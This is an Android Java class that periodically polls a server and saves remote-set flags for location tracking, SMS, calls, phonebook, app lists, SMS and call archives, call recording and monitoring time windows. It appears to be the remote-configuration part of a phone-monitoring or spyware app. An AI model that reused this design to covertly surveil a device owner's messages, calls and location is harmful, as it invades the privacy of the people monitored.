package com.inet.android.request;

import org.json.JSONException;
import org.json.JSONObject;

import com.inet.android.bs.Caller;
import com.inet.android.utils.Logging;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.os.AsyncTask;
import android.preference.PreferenceManager;

/**
 * Periodic request class
 * @author johny homicide
 *
 */
public class PeriodicRequest extends DefaultRequest {
	private final String LOG_TAG = "PeriodicRequest";
	Context ctx;
	
	public PeriodicRequest(Context ctx) {
		super(ctx);
		this.ctx = ctx;
	}

	@Override
	public void sendRequest(String request) {
		PeriodicRequestTask frt = new PeriodicRequestTask();
		frt.execute(request);
	}
	
	class PeriodicRequestTask extends AsyncTask<String, Void, Void> {

		@Override
		protected void onPreExecute() {
			super.onPreExecute();
		}

		@Override
		protected Void doInBackground(String... strs) {
			sendPostRequest(strs[0]);
			return null;
		}

		@Override
		protected void onPostExecute(Void result) {
			super.onPostExecute(result);
		}
	}

	@Override
	protected void sendPostRequest(String request) {
		try {
			getRequestData(Caller.doMake(request));
		} catch (JSONException e) {
			e.printStackTrace();
		}
	}

	@Override
	protected void getRequestData(String response) throws JSONException {
		Logging.doLog(LOG_TAG, "getResponseData: " + response, "getResponseData: " + response);

		SharedPreferences sp = PreferenceManager
				.getDefaultSharedPreferences(ctx);
		Editor ed = sp.edit();
		
		JSONObject jsonObject = new JSONObject(response);
		
		String str = jsonObject.getString("ANSWER");
		if (str != null) {
			ed.putString("ANSWER", str);
		} else {
			ed.putString("ANSWER", "");
		}

		str = jsonObject.getString("GEO");
		if (str != null) {
			ed.putString("GEO", str);
		} else {
			ed.putString("GEO", "5");
		}
		
		str = jsonObject.getString("GEOTYPE");
		if (str != null) {
			ed.putString("GEOTYPE", str);
		} else {
			ed.putString("GEOTYPE", "1");
		}
		
		str = jsonObject.getString("SMS");
		if (str != null) {
			ed.putString("SMS", str);
		} else {
			ed.putString("SMS", "0");
		}

		str = jsonObject.getString("CALL");
		if (str != null) {
			ed.putString("CALL", str);
		} else {
			ed.putString("CALL", "0");
		}
		
		str = jsonObject.getString("TELBK");
		if (str != null) {
			ed.putString("TELBK", str);
		} else {
			ed.putString("TELBK", "0");
		}

		str = jsonObject.getString("LISTAPP");
		if (str != null) {
			ed.putString("LISTAPP", str);
		} else {
			ed.putString("LISTAPP", "0");
		}
		
		str = jsonObject.getString("ARCSMS");
		if (str != null) {
			ed.putString("ARCSMS", str);
		} else {
			ed.putString("ARCSMS", "0");
		}

		str = jsonObject.getString("ARCCALL");
		if (str != null) {
			ed.putString("ARCCALL", str);
		} else {
			ed.putString("ARCCALL", "0");
		}

		str = jsonObject.getString("STBR");
		if (str != null) {
			ed.putString("STBR", str);
		} else {
			ed.putString("STBR", "0");
		}

		str = jsonObject.getString("RECALL");
		if (str != null) {
			ed.putString("RECALL", str);
		} else {
			ed.putString("RECALL", "0");
		}
		
		str = jsonObject.getString("UTCT");
		if (str != null) {
			ed.putString("UTCT", str);
		} else {
			ed.putString("UTCT", "0");
		}

		str = jsonObject.getString("TIME_FR");
		if (str != null) {
			ed.putString("TIME_FR", str);
		} else {
			ed.putString("TIME_FR", "");
		}

		str = jsonObject.getString("TIME_TO");
		if (str != null) {
			ed.putString("TIME_TO", str);
		} else {
			ed.putString("TIME_TO", "");
		}

		str = jsonObject.getString("BRK1_FR");
		if (str != null) {
			ed.putString("BRK1_FR", str);
		} else {
			ed.putString("BRK1_FR", "");
		}

		str = jsonObject.getString("BRK1_TO");
		if (str != null) {
			ed.putString("BRK1_TO", str);
		} else {
			ed.putString("BRK1_TO", "");
		}
		
		str = jsonObject.getString("TIME_DEV");
		if (str != null) {
			ed.putString("TIME_DEV", str);
		} else {
			ed.putString("TIME_DEV", "");
		}

		ed.commit();
	}
}
